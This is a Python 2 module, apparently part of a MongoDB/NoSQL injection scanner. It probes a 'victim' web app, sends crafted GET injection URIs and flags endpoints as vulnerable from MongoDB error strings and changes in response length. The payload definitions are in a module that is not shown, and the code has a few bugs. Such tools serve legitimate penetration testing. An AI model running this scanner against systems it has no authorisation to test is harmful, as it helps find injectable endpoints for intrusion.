import urllib2

import time

import globalVar as GlobalVar
from buildAttackUri import buildAttackUri
def getApps():#define the Attack method
    print "Web App Attacks (GET)"
    print "====================="
    #verify app is working
    print "checking to see if site at"+ str(GlobalVar.get_victim()) + ":" + str(GlobalVar.get_webPort()) + str(GlobalVar.get_url()) + " is up..."
    appUp = False #make flag of login successful
    if(GlobalVar.get_https() == "OFF"):
        appURL = "http://" + str(GlobalVar.get_victim()) + ":" + str(GlobalVar.get_webPort()) + str(GlobalVar.get_url())
    else:
        appURL = "https://" + str(GlobalVar.get_victim()) + ":" + str(GlobalVar.get_webPort()) + str(GlobalVar.get_url())
    requestHeaders = {}
    try:
        req = urllib2.Request(appURL, None, requestHeaders)
        appRespCode = urllib2.urlopen(req).getcode()
        if appRespCode == 200:
            normLength = int(len(urllib2.urlopen(req).read()))
            timeReq = urllib2.urlopen(req)
            start = time.time()
            page = timeReq.read()
            end = time.time()
            timeReq.close()
            timeBase = round((end - start), 3)

            if GlobalVar.get_verb() == "ON":
                print "App is up! Got response length of " + str(normLength) + " and response time of " + str(
                    timeBase) + " seconds.  Starting injection test.\n"

            else:
                print "App is up!"
            appUp = True

        else:
            print "Got " + str(appRespCode) + "from the app, check your options."
    except Exception, e:
        print e
        print "Looks like the server didn't respond.  Check your options."

    if(appUp == True):
        injectString = raw_input("Enter random parameter to inject: ")
        print "Using " + injectString + " for injection testing.\n"

    if "?" not in appURL:
        print "No URI parameters provided for GET request...Check your options.\n"
        raw_input("Press enter to continue...")
        return ()
    split_uri = appURL.split("?")
    if split_uri[1] == '':
        raw_input(
            "No parameters in uri.  Check options settings.  Press enter to return to main menu...")
        return ()

    buildAttackSet = buildAttackUri(appURL, injectString)
    uriArray = buildAttackSet[0]
    attackDescriptionSet = buildAttackSet[1]
    attackSum = attackDescriptionSet[0];
    print "Attack queries are listed:"
    for index in range(0,attackSum):
        print attackDescriptionSet[index + 1]
#        print uriArray[index]


    #This randomUri is same with URI which user input in option except parameter

#    randomUri = uriArray[0]

#    print "URI :" + randomUri
#    req = urllib2.Request(randomUri, None, requestHeaders)

#    randLength = int(len(urllib2.urlopen(req).read()))
#    print "Got response length of " + str(randLength) + "."
#    differenceLength = abs(normLength - randLength)

#    if differenceLength == 0:
#        print "No change in response size injecting a random parameter..\n"
#    else:
#        print "Random value variance: " + str(differenceLength) + "\n"

#    print "req:" + urllib2.urlopen(req).read()

#    print "requestHeaders" + requestHeaders
    print "\n"
    print "Start injection:"
    for index in range(0,attackSum):
        print "injecting: " + uriArray[index]
#        if GlobalVar.get_verb() == "ON":
#            print "Checking random injected parameter HTTP response size using " + uriArray[index] + "...\n"
#        else:
#            print "Sending random parameter value..."
        if GlobalVar.get_verb() == "ON":
            print attackDescriptionSet[index]
        req = urllib2.Request(uriArray[index], None, requestHeaders)
        errorCheck = errorTest(str(urllib2.urlopen(req).read()), index, uriArray)

        if errorCheck == False:
            injLen = int(len(urllib2.urlopen(req).read()))
            checkResult(normLength, injLen, index, uriArray)
    print "\n"
    print "Vulnerable URLs:"
    print "\n".join(GlobalVar.get_vulnAddrs())
    print "\n"
    print "Possibly vulnerable URLs:"
    print"\n".join(GlobalVar.get_possAddrs())
    print "\n"
    print "Timing based attacks:"


#        checkResult(randLength, injectionLen, index)

#    for injectionURI in uriArray:
#        print "URI: " + injectionURI
#        req = urllib2.Request(injectionURI, None, requestHeaders)
#        randLength = int(len(urllib2.urlopen(req).read()))
#
#         print "Got response length of " + str(randLength) + "."
def errorTest(errorText, index, uriArray):

    if errorText.find('ReferenceError') != -1 or errorText.find('SyntaxError') != -1 or errorText.find('ILLEGAL') != -1:
        print "Injection returned a MongoDB Error.  Injection may be possible."
        if GlobalVar.get_httpMethod() == "GET":
            GlobalVar.set_possAddrs(uriArray[index])
            return True
        else:
            post = 0
            #post
    else:
        return False
def checkResult(baseSize, respSize, index,uriArray):
    delta = abs(respSize - baseSize)
    if (delta >= 100) and (respSize != 0):
        if GlobalVar.get_verb() == "ON":
            print "Response varied " + str(delta) + " bytes from random parameter value! Injection works!"
        else:
            print "Successful injection!"

        if GlobalVar.get_httpMethod() == "GET":
            GlobalVar.get_vulnAddrs().append(uriArray[index])
        else:
           post = 0
            #post
        return

    elif (delta > 0) and (delta < 100) and (respSize != 0):
        if GlobalVar.get_verb() == "ON":
            print "Response variance was only " + str(
                delta) + " bytes. Injection might have worked but difference is too small to be certain. "
        else:
            print "Possible injection."

        if GlobalVar.get_httpMethod() == "GET":
            GlobalVar.get_possAddrs().append(uriArray[index])
        else:
            post = 0
            # post
        return

    elif (delta == 0):
        if GlobalVar.get_verb() == "ON":
            print "Random string response size and not equals injection were the same. Injection did not work."
        else:
            print "Injection failed."
        return

    else:
        if GlobalVar.get_verb() == "ON":
            print "Injected response was smaller than random response.  Injection may have worked but requires verification."
        else:
            print "Possible injection."
        if GlobalVar.get_httpMethod() == "GET":
            GlobalVar.get_possAddrs.append(uriArray[index])
        else:
            post = 0
            # post
        return




